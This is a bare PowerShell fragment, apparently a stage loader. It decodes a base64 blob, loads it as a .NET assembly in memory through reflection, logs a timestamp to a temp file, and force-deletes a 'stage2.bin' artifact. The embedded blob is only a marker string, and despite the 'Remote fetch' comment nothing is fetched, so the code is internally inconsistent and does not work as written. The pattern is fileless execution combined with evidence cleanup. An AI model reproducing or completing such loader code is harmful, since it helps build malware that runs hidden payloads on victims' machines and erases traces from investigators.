
<# Remote fetch #> $StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp3MmE5NWNxZ2dn'); [Reflection.Assembly]::Load($StageBytes); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
